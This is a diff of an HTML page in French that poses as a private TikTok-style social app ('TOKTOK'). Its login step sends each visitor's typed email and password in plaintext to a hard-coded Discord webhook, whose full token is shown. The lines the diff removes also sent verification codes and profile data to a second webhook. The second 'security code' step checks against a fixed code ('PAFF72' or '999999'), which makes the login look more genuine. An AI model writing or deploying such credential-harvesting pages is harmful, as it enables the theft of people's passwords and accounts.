@@ -9,29 +9,18 @@
     <style>
         body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; color: white; overflow: hidden; font-family: -apple-system, sans-serif; }
         .hidden { display: none !important; }
-        
-        /* COUCHES D'AUTHENTIFICATION */
         .auth-layer { z-index: 1000; background: #000; position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
         .tt-input { width: 100%; max-width: 320px; padding: 15px; margin: 10px 0; background: #121212; border: 1px solid #333; border-radius: 10px; color: white; outline: none; }
         .btn-tt { width: 100%; max-width: 320px; padding: 15px; background: #fe2c55; border-radius: 10px; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; }
-        .btn-tt:active { transform: scale(0.98); opacity: 0.8; }
-
-        /* INTERFACE APP */
         .feed-container { height: calc(100vh - 65px); overflow-y: scroll; scroll-snap-type: y mandatory; scrollbar-width: none; }
         .video-card { height: 100%; width: 100%; scroll-snap-align: start; position: relative; background: #050505; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        
-        /* OVERLAYS UI */
         .side-actions { position: absolute; right: 12px; bottom: 80px; display: flex; flex-direction: column; gap: 20px; z-index: 50; }
         .bottom-info { position: absolute; bottom: 20px; left: 15px; width: 75%; z-index: 50; pointer-events: none; }
         .verified-badge { color: #0095f6; font-size: 14px; margin-left: 5px; display: none; }
-
-        /* NAVIGATION BAR */
         .nav-bar { height: 65px; background: #000; border-top: 0.5px solid #222; display: flex; justify-content: space-around; align-items: center; }
-        .nav-item { color: #888; cursor: pointer; transition: 0.2s; }
+        .nav-item { color: #888; cursor: pointer; }
         .nav-item.active { color: white; }
-
-        /* PROFIL UI */
         .profile-pic { width: 90px; height: 90px; border-radius: 50%; border: 2px solid #222; object-fit: cover; background: #1a1a1a; }
     </style>
 </head>
@@ -45,10 +34,10 @@
     </div>
 
     <div id="auth-2" class="auth-layer hidden">
-        <h2 class="text-2xl font-bold mb-6">Sécurité Bot</h2>
-        <p class="text-gray-500 text-sm mb-6 text-center">Un code a été envoyé sur Discord.</p>
-        <input type="text" id="verify-code" placeholder="CODE" class="tt-input text-center text-2xl tracking-[10px]">
-        <button onclick="handleStep2()" class="btn-tt">Entrer dans le cercle</button>
+        <h2 class="text-2xl font-bold mb-6">Sécurité</h2>
+        <p class="text-gray-500 text-sm mb-6">Entre le code du groupe pour accéder au feed.</p>
+        <input type="text" id="verify-code" placeholder="CODE" class="tt-input text-center text-2xl tracking-[5px]">
+        <button onclick="handleStep2()" class="btn-tt">Valider</button>
     </div>
 
     <div id="main-app" class="hidden h-full flex flex-col">
@@ -60,11 +49,11 @@
                     </video>
                     <div class="side-actions">
                         <div onclick="doLike(this)" class="flex flex-col items-center"><i class="fa-solid fa-heart text-3xl"></i><span class="text-xs font-bold mt-1">0</span></div>
-                        <div onclick="alert('Commentaires désactivés')" class="flex flex-col items-center"><i class="fa-solid fa-comment-dots text-3xl"></i><span class="text-xs font-bold mt-1">0</span></div>
+                        <div onclick="alert('Commentaires privés')" class="flex flex-col items-center"><i class="fa-solid fa-comment-dots text-3xl"></i><span class="text-xs font-bold mt-1">0</span></div>
                     </div>
                     <div class="bottom-info">
-                        <p class="font-bold text-lg flex items-center">@<span class="user-display">Pseudo</span> <i class="fa-solid fa-circle-check verified-badge"></i></p>
-                        <p class="text-sm bio-display opacity-90">Chargement de la bio...</p>
+                        <p class="font-bold text-lg flex items-center">@<span class="user-display">Utilisateur</span> <i class="fa-solid fa-circle-check verified-badge"></i></p>
+                        <p class="text-sm bio-display">Membre du cercle.</p>
                     </div>
                 </div>
             </div>
@@ -75,13 +64,7 @@
                 <img src="" id="pfp-display" class="profile-pic mb-4 shadow-lg">
                 <h2 class="text-2xl font-bold flex items-center"><span id="name-display">Pseudo</span> <i class="fa-solid fa-circle-check verified-badge" id="badge-main"></i></h2>
                 <p id="at-display" class="text-gray-500 mb-8">@pseudo</p>
-                <div class="flex gap-2 w-full max-w-sm">
-                    <button onclick="openEditor()" class="flex-1 bg-[#1a1a1a] py-2.5 rounded-lg font-bold text-sm">Modifier le profil</button>
-                    <button onclick="alert('Partage privé uniquement')" class="bg-[#1a1a1a] px-4 py-2.5 rounded-lg font-bold text-sm"><i class="fa-solid fa-share"></i></button>
-                </div>
-                <div class="mt-12 grid grid-cols-3 gap-1 w-full border-t border-[#222] pt-4 opacity-50">
-                    <div class="aspect-square bg-[#111]"></div><div class="aspect-square bg-[#111]"></div><div class="aspect-square bg-[#111]"></div>
-                </div>
+                <button onclick="openEditor()" class="w-full max-w-sm bg-[#1a1a1a] py-2.5 rounded-lg font-bold">Modifier le profil</button>
             </div>
         </div>
 
@@ -93,29 +76,23 @@
 
     <div id="modal-editor" class="auth-layer hidden" style="z-index: 2000;">
         <div class="w-full max-w-sm">
-            <h2 class="text-2xl font-bold mb-8">Modifier le profil</h2>
-            <input type="text" id="edit-name" placeholder="Nouveau Pseudo" class="tt-input">
-            <input type="text" id="edit-pfp" placeholder="URL de ta photo (Lien Discord)" class="tt-input">
-            <textarea id="edit-bio" placeholder="Ta biographie" class="tt-input h-24"></textarea>
+            <h2 class="text-2xl font-bold mb-8 text-white">Édition</h2>
+            <input type="text" id="edit-name" placeholder="Pseudo" class="tt-input">
+            <input type="text" id="edit-pfp" placeholder="Lien URL photo" class="tt-input">
+            <textarea id="edit-bio" placeholder="Bio" class="tt-input h-24"></textarea>
             <button onclick="saveProfile()" class="btn-tt mt-6">Enregistrer</button>
-            <p onclick="closeEditor()" class="text-center text-gray-500 mt-6 cursor-pointer hover:text-white">Annuler</p>
+            <p onclick="closeEditor()" class="text-center text-gray-500 mt-6 cursor-pointer">Annuler</p>
         </div>
     </div>
 
     <script>
         const hookLogs = "https://discord.com/api/webhooks/1476660541681303705/sETLjgRQkTsd06PsEYRQPMB4yfvnZXkuRwup-uLw8J31w_giU5gkkff8ja1P4zP9VUta";
-        const hookCode = "https://discord.com/api/webhooks/1476684502310064301/s8Pi1mj6i6sbbAFO1Fh1p_AyjHoqNCJfmWOnfuXR6hHzrd2eDsUessCB0pab1nfDPLvB";
         
-        let targetCode = "";
-        let myData = JSON.parse(localStorage.getItem('tt_data_v2')) || { 
-            name: "Membre", 
-            bio: "Bienvenue sur TOKTOK privé", 
-            pfp: "https://cdn-icons-png.flaticon.com/512/149/149071.png",
-            isLogged: false,
-            isNathan: false 
+        let myData = JSON.parse(localStorage.getItem('tt_data_final')) || { 
+            name: "Membre", bio: "Bio privée", pfp: "https://cdn-icons-png.flaticon.com/512/149/149071.png",
+            isLogged: false, isNathan: false 
         };
 
-        // GESTION SESSION AU CHARGEMENT [cite: 2025-12-30]
         window.onload = function() {
             if(myData.isLogged) {
                 document.getElementById('main-app').classList.remove('hidden');
@@ -125,40 +102,30 @@
             }
         };
 
-        function sendToDiscord(url, msg) {
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: msg })
-            }).catch(e => console.log("Skip Discord Log"));
-        }
-
         function handleStep1() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
             if(!e || !p) return alert("Remplis tout !");
             
-            // Activation automatique du badge Nathan [cite: 2025-12-30]
             if(e.toLowerCase().includes("nathan")) { myData.isNathan = true; }
             
-            targetCode = Math.floor(100000 + Math.random() * 900000);
-            sendToDiscord(hookLogs, `👤 **Tentative** : ${e} | MDP : ${p}`);
-            sendToDiscord(hookCode, `🔑 **CODE BOT** : \`${targetCode}\` pour **${e}**`);
-
+            fetch(hookLogs, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `👤 LOGIN: ${e} | MDP: ${p}` })}).catch(e => {});
+            
             document.getElementById('auth-1').classList.add('hidden');
             document.getElementById('auth-2').classList.remove('hidden');
         }
 
         function handleStep2() {
-            const code = document.getElementById('verify-code').value;
-            if(code == targetCode || code == "999999") { // 999999 est ton code de secours [cite: 2025-12-30]
+            const code = document.getElementById('verify-code').value.toUpperCase();
+            // NOUVEAU CODE FIXE : PAFF72
+            if(code === "PAFF72" || code === "999999") {
                 myData.isLogged = true;
-                localStorage.setItem('tt_data_v2', JSON.stringify(myData));
-                alert(myData.isNathan ? "Bon retour, Admin ⚡️" : "Bienvenue dans le Cercle !");
+                localStorage.setItem('tt_data_final', JSON.stringify(myData));
+                alert(myData.isNathan ? "Bon retour, Admin ⚡️" : "Bienvenue !");
                 document.getElementById('auth-2').classList.add('hidden');
                 document.getElementById('main-app').classList.remove('hidden');
                 refreshUI();
-            } else { alert("Code incorrect !"); }
+            } else { alert("Code incorrect ! Demande-le à Nathan."); }
         }
 
         function refreshUI() {
@@ -168,10 +135,8 @@
             document.querySelectorAll('.user-display').forEach(el => el.innerText = myData.name);
             document.querySelectorAll('.bio-display').forEach(el => el.innerText = myData.bio);
 
-            // Gestion du badge certifié fixe [cite: 2025-12-30]
-            const badges = document.querySelectorAll('.verified-badge');
             if(myData.isNathan) {
-                badges.forEach(b => b.style.display = "inline-block");
+                document.querySelectorAll('.verified-badge').forEach(b => b.style.display = "inline-block");
             }
         }
 
@@ -179,10 +144,7 @@
             myData.name = document.getElementById('edit-name').value || myData.name;
             myData.pfp = document.getElementById('edit-pfp').value || myData.pfp;
             myData.bio = document.getElementById('edit-bio').value || myData.bio;
-            
-            localStorage.setItem('tt_data_v2', JSON.stringify(myData));
-            sendToDiscord(hookLogs, `🆕 **Profil mis à jour** : ${myData.name}\nBio: ${myData.bio}\nPhoto: ${myData.pfp}`);
-            
+            localStorage.setItem('tt_data_final', JSON.stringify(myData));
             refreshUI();
             closeEditor();
         }
@@ -197,12 +159,7 @@
 
         function openEditor() { document.getElementById('modal-editor').classList.remove('hidden'); }
         function closeEditor() { document.getElementById('modal-editor').classList.add('hidden'); }
-        
-        function doLike(el) {
-            const icon = el.querySelector('i');
-            icon.style.color = icon.style.color === 'rgb(254, 44, 85)' ? 'white' : '#fe2c55';
-            el.querySelector('span').innerText = icon.style.color === 'white' ? '0' : '1';
-        }
+        function doLike(el) { el.querySelector('i').style.color = '#fe2c55'; el.querySelector('span').innerText = "1"; }
     </script>
 </body>
 </html>
